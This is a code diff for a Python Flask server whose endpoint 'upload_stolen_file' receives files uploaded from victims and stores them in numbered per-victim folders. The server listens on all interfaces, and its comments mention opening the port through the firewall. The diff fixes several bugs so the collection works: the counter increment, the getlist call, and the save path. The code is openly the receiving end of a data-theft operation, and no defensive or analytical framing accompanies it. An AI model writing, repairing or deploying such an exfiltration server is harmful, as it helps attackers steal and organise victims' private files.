@@ -20,13 +20,13 @@ def upload_stolen_file():
             os.makedirs(victim_dir)
             break
         else:
-            victim_index + 1
+            victim_index += 1
     # Check if POST request has the file part
     if 'files[]' not in request.files:
         flash('No file part')
         return jsonify({'error': 'No file part'}), 400
     
-    files = request.files.getlist['files[]']
+    files = request.files.getlist('files[]')
     if not files:
         flash('No selected files')
         return jsonify({'error': 'No selected files (n)'}), 400
@@ -34,7 +34,7 @@ def upload_stolen_file():
     for file in files:
         if file.filename == '':
             return jsonify({'error': 'No selected file (1)'}), 400
-        file.save(os.path.join(UPLOAD_FOLDER, file.filename))
+        file.save(os.path.join(victim_dir, file.filename))
     return jsonify({'success': f'Files uploaded successfully to directory {victim_dir}'}), 200
 
 @app.route('/check-availability', methods=['GET', 'HEAD'])
@@ -48,7 +48,6 @@ def check_availability():
     return
 
 if __name__ == '__main__':
-    # Debugging
     app.run(host='0.0.0.0', port=5000)
 #Specify port
 #Allow port through firewall
